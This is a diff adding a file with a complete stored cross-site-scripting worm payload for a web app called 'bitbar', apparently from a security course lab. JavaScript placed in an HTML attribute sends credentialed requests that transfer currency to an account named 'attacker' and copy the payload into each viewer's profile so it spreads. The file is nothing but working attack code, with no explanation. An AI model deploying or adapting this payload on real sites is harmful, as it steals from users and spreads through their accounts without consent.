@@ -1,0 +1,15 @@
+origin code:
+
+<p id="bitbar_count" class='
+    var rTransfer = new XMLHttpRequest();
+    rTransfer.open("POST", "post_transfer");
+    rTransfer.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    rTransfer.withCredentials = true;
+    rTransfer.send("quantity=1&destination_username=attacker");
+    var rProfile = new XMLHttpRequest();
+    rProfile.open("POST", "set_profile");
+    var new_profile = document.getElementById("profile").innerHTML;
+    rProfile.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    rProfile.withCredentials = true;
+    rProfile.send("new_profile=" + encodeURIComponent(new_profile));
+'></p>
